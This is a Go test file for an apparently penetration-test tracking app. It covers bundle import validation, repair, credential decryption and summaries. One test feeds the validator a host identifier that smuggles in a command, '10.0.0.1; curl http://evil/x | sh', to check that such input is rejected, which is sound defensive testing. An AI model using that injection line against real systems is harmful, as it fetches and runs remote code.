package api

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/google/uuid"

	appcrypto "penkeeper/internal/crypto"
	"penkeeper/internal/model"
)

func TestValidScriptOutput(t *testing.T) {
	for in, want := range map[string]bool{
		``:                                   true,
		`[]`:                                 true,
		`[{"id":"http-title","output":"x"}]`: true,
		`"not-an-array"`:                     false,
		`null`:                               false,
		`{"id":"a"}`:                         false,
		`[1,2]`:                              false,
		`[{"id":5}]`:                         false,
		`[`:                                  false,
	} {
		if got := validScriptOutput(in); got != want {
			t.Errorf("validScriptOutput(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestBundleValidate(t *testing.T) {
	good := exportBundle{Version: 2, Assessments: []exportAssessment{
		{Name: "Legacy", Hosts: []exportHost{{Identifier: "10.0.0.1"}}},
		{Name: "Infra", Type: "infrastructure", Hosts: []exportHost{{Identifier: "dc01.corp.local"}}},
		// Import skips it, so its hosts are not checked.
		{Name: "Web", Type: "web_application", Hosts: []exportHost{{Identifier: "https://app.example.com/login?x=1"}}},
	}}
	if p := good.validate(); len(p) != 0 {
		t.Fatalf("valid bundle rejected: %v", p)
	}

	// Messages number assessments by their place in the bundle, counting
	// skipped ones.
	bad := exportBundle{Version: 2, Assessments: []exportAssessment{
		{Name: "Web", Type: "web_application", Hosts: []exportHost{{Identifier: "my app"}}},
		{Name: "A", Hosts: []exportHost{{Identifier: "10.0.0.1; curl http://evil/x | sh"}}},
		{Name: "B", Type: "infrastructure", Hosts: []exportHost{{Identifier: "my app"}, {Identifier: "bad\nline"}}},
	}}
	p := bad.validate()
	for _, want := range []string{
		`assessment 2 "A", host "10.0.0.1; curl http://evil/x | sh": identifier must`,
		`assessment 3 "B", host "my app": identifier must`,
		`assessment 3 "B", host "bad\nline"`,
	} {
		if !strings.Contains(strings.Join(p, "\n"), want) {
			t.Errorf("problems %q lack %q", p, want)
		}
	}
	if len(p) != 3 {
		t.Errorf("got %d problems, want 3: %q", len(p), p)
	}
}

func TestBundleSkipped(t *testing.T) {
	b := exportBundle{Version: 2, Assessments: []exportAssessment{
		{Name: "Old"},
		{Name: "Net", Type: "infrastructure"},
		{Name: "Shop", Type: "web_application"},
		{Name: "Phone", Type: "mobile_application"},
		{Name: "Router", Type: "hardware"},
		{Name: "Odd", Type: "constructor"},
	}}
	want := []string{
		`assessment 3 "Shop": type "web_application" is not infrastructure`,
		`assessment 4 "Phone": type "mobile_application" is not infrastructure`,
		`assessment 5 "Router": type "hardware" is not infrastructure`,
	}
	if got := b.skipped(); strings.Join(got, "\n") != strings.Join(want, "\n") {
		t.Errorf("skipped %q, want %q", got, want)
	}
	// An unknown type counts as infrastructure.
	for i, ea := range b.Assessments {
		if got, want := ea.imported(), i < 2 || ea.Name == "Odd"; got != want {
			t.Errorf("assessment %q: imported %v, want %v", ea.Name, got, want)
		}
	}
	if got := (exportBundle{Assessments: b.Assessments[:2]}).skipped(); len(got) != 0 {
		t.Errorf("nothing to skip: %q", got)
	}

	// Export writes no type, so its bundles never skip anything.
	js, err := json.Marshal(exportAssessment{Name: "Net"})
	if err != nil || strings.Contains(string(js), `"type"`) {
		t.Errorf("exported assessment %s (err %v) has a type", js, err)
	}
}

func TestBundleRepair(t *testing.T) {
	b := exportBundle{Version: 2, Assessments: []exportAssessment{
		{Name: "", Hosts: []exportHost{{Identifier: "10.9.9.9", Ports: []exportPort{
			{Number: 0, Protocol: "tcp"},
			{Number: 80, Protocol: "bogus"},
			{Number: 80, Protocol: "tcp", ScriptOutput: `"not-an-array"`},
			{Number: 445, Protocol: "tcp", ScriptOutput: `[{"id":"smb-os-discovery","output":"x"}]`},
			{Number: 0, Protocol: "ip"},
		}}}},
		{Name: strings.Repeat("n", 201)},
		{Name: "Legacy"},
		// Import skips it, so repair leaves it alone.
		{Name: "", Type: "hardware", Hosts: []exportHost{{Identifier: "Router X1", Ports: []exportPort{{Number: 0, Protocol: "tcp"}}}}},
	}}
	notes := b.repair()
	for _, want := range []string{
		`assessment 1 "": empty name imported as "Untitled assessment"`,
		`port 0/tcp: skipped, port number out of range`,
		`port 80/bogus: skipped, protocol must be`,
		`port 80/tcp: NSE script output dropped`,
		`assessment 2 "` + strings.Repeat("n", 60) + `…": name shortened to 200 characters`,
	} {
		if !strings.Contains(strings.Join(notes, "\n"), want) {
			t.Errorf("notes %q lack %q", notes, want)
		}
	}
	if len(notes) != 5 {
		t.Errorf("got %d notes, want 5: %q", len(notes), notes)
	}
	if b.Assessments[0].Name != "Untitled assessment" || len([]rune(b.Assessments[1].Name)) != 200 {
		t.Errorf("names: %q, %d runes", b.Assessments[0].Name, len([]rune(b.Assessments[1].Name)))
	}
	if hw := b.Assessments[3]; hw.Name != "" || len(hw.Hosts[0].Ports) != 1 {
		t.Errorf("skipped assessment repaired: %+v", hw)
	}
	ports := b.Assessments[0].Hosts[0].Ports
	if len(ports) != 3 || ports[0].Number != 80 || ports[0].ScriptOutput != "" ||
		ports[1].ScriptOutput == "" || ports[2].Protocol != "ip" {
		t.Errorf("ports after repair: %+v", ports)
	}
	if p := b.validate(); len(p) != 0 {
		t.Errorf("repaired bundle rejected: %v", p)
	}
	if again := b.repair(); len(again) != 0 {
		t.Errorf("second repair changed %q", again)
	}
}

func TestBundleValidateCapsProblems(t *testing.T) {
	var hosts []exportHost
	for i := 0; i < maxImportProblems+5; i++ {
		hosts = append(hosts, exportHost{Identifier: "bad host"})
	}
	p := exportBundle{Assessments: []exportAssessment{{Name: "A", Hosts: hosts}}}.validate()
	if len(p) != maxImportProblems+1 || p[len(p)-1] != "and 5 more" {
		t.Fatalf("got %d problems ending %q", len(p), p[len(p)-1])
	}
}

func TestExportHostCompromisedRoundTrip(t *testing.T) {
	b, err := json.Marshal(exportHost{Identifier: "10.0.0.5", Compromised: true})
	if err != nil {
		t.Fatal(err)
	}
	var back exportHost
	if err := json.Unmarshal(b, &back); err != nil || !back.Compromised {
		t.Fatalf("compromised lost in %s (err %v)", b, err)
	}
	// Bundles from before the field import as not compromised.
	var old exportHost
	if err := json.Unmarshal([]byte(`{"identifier":"10.0.0.5"}`), &old); err != nil || old.Compromised {
		t.Fatalf("old bundle host: %+v, %v", old, err)
	}
}

func TestDecryptCredentialFlagsFailures(t *testing.T) {
	appcrypto.Init([]byte("key-A"))
	encPass, encHash, err := encryptCredentialSecrets("Sup3rS3cret!", "aad3b435:8846f7ea")
	if err != nil || !appcrypto.IsEncrypted(encPass) || !appcrypto.IsEncrypted(encHash) {
		t.Fatalf("encrypt: %q %q %v", encPass, encHash, err)
	}
	cr := model.Credential{Username: "administrator", Password: encPass, Hash: encHash}

	v := decryptCredential(cr)
	if v.Password != "Sup3rS3cret!" || v.Hash != "aad3b435:8846f7ea" || v.PasswordError || v.HashError {
		t.Fatalf("right key: %+v", v)
	}
	// Legacy plaintext passes through.
	if v := decryptCredential(model.Credential{Password: "old", Hash: "plainhash"}); v.Password != "old" || v.Hash != "plainhash" || v.PasswordError || v.HashError {
		t.Fatalf("plaintext: %+v", v)
	}

	appcrypto.Init([]byte("key-B"))
	defer appcrypto.Init([]byte("key-A"))
	v = decryptCredential(cr)
	if v.Password != "" || v.Hash != "" || !v.PasswordError || !v.HashError {
		t.Fatalf("wrong key: %+v", v)
	}
	b, _ := json.Marshal(v)
	if strings.Contains(string(b), "enc:") || !strings.Contains(string(b), `"password_error":true`) {
		t.Fatalf("wrong-key JSON: %s", b)
	}
}

func TestAssessmentSummaries(t *testing.T) {
	a, b := uuid.New(), uuid.New()
	h1, h2 := uuid.New(), uuid.New()
	got := assessmentSummaries(
		[]model.Assessment{{ID: a, Name: "A"}, {ID: b, Name: "B"}},
		[]hostPortCount{{ID: h1, AssessmentID: a, Ports: 3}, {ID: h2, AssessmentID: a, Ports: 0}, {ID: uuid.New(), AssessmentID: uuid.New(), Ports: 9}},
	)
	if len(got) != 2 || got[0].HostCount != 2 || got[0].PortCount != 3 || got[1].HostCount != 0 || got[1].PortCount != 0 {
		t.Fatalf("counts: %+v", got)
	}
	js, _ := json.Marshal(got)
	var old []struct {
		Hosts []struct {
			ID    uuid.UUID         `json:"id"`
			Ports []json.RawMessage `json:"ports"`
		} `json:"hosts"`
	}
	if err := json.Unmarshal(js, &old); err != nil {
		t.Fatal(err)
	}
	// What the old dashboard counted: hosts.length and each host's ports.length.
	if len(old[0].Hosts) != 2 || old[0].Hosts[0].ID != h1 || len(old[0].Hosts[0].Ports) != 3 || old[1].Hosts == nil {
		t.Fatalf("old-client view: %s", js)
	}
}

// Hosts of an assessment with a legacy type keep their data: identifiers the
// strict rule rejects are repaired and kept unique, and the original goes
// into the label. Other assessments are not repaired, so validate still
// rejects their invalid identifiers.
func TestBundleRepairLegacyIdentifiers(t *testing.T) {
	b := exportBundle{Version: 2, Assessments: []exportAssessment{
		{Name: "Old", Type: "network", Hosts: []exportHost{
			{Identifier: "https://shop.example.com/login?x=1"},
			{Identifier: "shop.example.com"},
			{Identifier: "my app", Label: "staging"},
			{Identifier: "!!!"},
		}},
		{Name: "Net", Type: "infrastructure", Hosts: []exportHost{{Identifier: "my app"}}},
	}}
	notes := b.repair()
	var got []string
	for _, eh := range b.Assessments[0].Hosts {
		got = append(got, eh.Identifier+" | "+eh.Label)
	}
	want := []string{
		"shop.example.com-2 | https://shop.example.com/login?x=1",
		"shop.example.com | ",
		"my-app | my app — staging",
		"host | !!!",
	}
	if strings.Join(got, "\n") != strings.Join(want, "\n") {
		t.Errorf("repaired hosts\n%s\nwant\n%s", strings.Join(got, "\n"), strings.Join(want, "\n"))
	}
	if len(notes) != 3 {
		t.Errorf("got %d repair notes, want 3: %q", len(notes), notes)
	}
	if id := b.Assessments[1].Hosts[0].Identifier; id != "my app" {
		t.Errorf("infrastructure host repaired to %q", id)
	}
	if p := b.validate(); len(p) != 1 || !strings.Contains(p[0], `"Net"`) {
		t.Errorf("validate: %q, want one problem for the infrastructure host", p)
	}
}
